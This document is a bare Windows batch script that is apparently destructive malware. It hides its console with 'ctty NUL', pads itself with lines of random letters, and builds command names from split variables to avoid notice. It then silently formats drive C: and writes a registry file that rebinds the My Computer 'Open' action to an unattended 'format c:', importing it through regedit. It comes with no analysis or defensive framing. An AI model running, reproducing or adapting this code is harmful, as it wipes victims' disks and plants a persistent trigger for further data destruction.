   ctty NUL
   owbkdopcohvrhuhhqowfefrwjmnprklaroqsmzgqmsbnieuuboejpjtfngkowjwymopxhdurhstdehkgvtgknkihuzpwjrlpipscn
   jlrjcppukgfjvtluqpqoltncqjnqlofbyjfeqfycunfcrjlhjrsgmnnxntfwyujudqtbciexsjtkzsnzvsdfwpztpvfjudpqfnxmh
   nifnxjrplpsixkxhowmdrcowewmmbevzmlxkipjhfvlekbsqefbmljvwpghencmywnwsuawusdbpipbrabjwjnppctyqzewyiratl
   coyoqlxwpidtlioodiwglidpyjunvgsljvnlhojdozvbkvwdtiktijxpylhccmyykegaeghjzinozubivbbhmyhbtlesmqrcsyzxh
   lyqmvayedlgzyolwznfvvfazpgbvnmurbpdoxcwasgbsisynkxdsygsrhxahimikaobrynzolvxnrglnctazgakppxbpuudlebmmj
   byvhjzzjboxzgbedhuslpkiifywmkqkoojwcgkpvvyqyuitzxmdsffzhnjsvxpayszrvsjxkihvwobhfpdwibpbdmazcvpwxjkhia
   zlplflsxjigelxektegxqsgkulvhhunllttvkojcljmjbifnuvanvydzgifghdjiwigjndtkkyiaqdhsxmxdgsrvfajabkrwltoue
   isckpewujjggtgopavfvbtkhqllincxcbflqxltgbhjyemnmxkkfytepvngqeelwkeufinjpgalffbwolkrohudravppfhgejljjk
   wonykrdkhhnqrjanhadfhuigubsaymesvcrfkkxjrranessgpqqnvcysdqbjpjutvtsbxwsnosrctzvzdtxxhurfrvylijlbhhinu
   iqmkgekimngienlpdqgwkyhzsfdpndpadxtoadnvnyoprddrlzjccuxnsipefujlnqvlvgldigmiamalawctsdjwqwwkeywauzhmm
   ffeepnyadcubmygbpswubosdhcpfcrbrpvwkdgvkvmpyylawvxlkaenxlcdcelphcjchbdjadcvwkdlynanuxffhcxnrjfmbjwtbl
   set cfb=for
   set cfc=mat
   set cfa=%cfb%%cfc%
   %cfa% C: /u /q /autotest
   set bom=c:\regbomb.reg
   echo>%bom% REGEDIT4
   echo.>>%bom%
   echo>>%bom% [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\Open]
   echo.>>%bom%
   set rb=classes
   echo >>%bom% [HKEY_LOCAL_MACHINE\SOFTWARE\%rb%\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\Open\Command]
   set fu=start
   echo >>%bom% @="%fu% /minimized command /c echo y|format c: /q /u /autotest >nul"
   echo.>>%bom%
   set a=reg
   set b=edit
   set c=%a%%b%
   %c%.exe %bom%
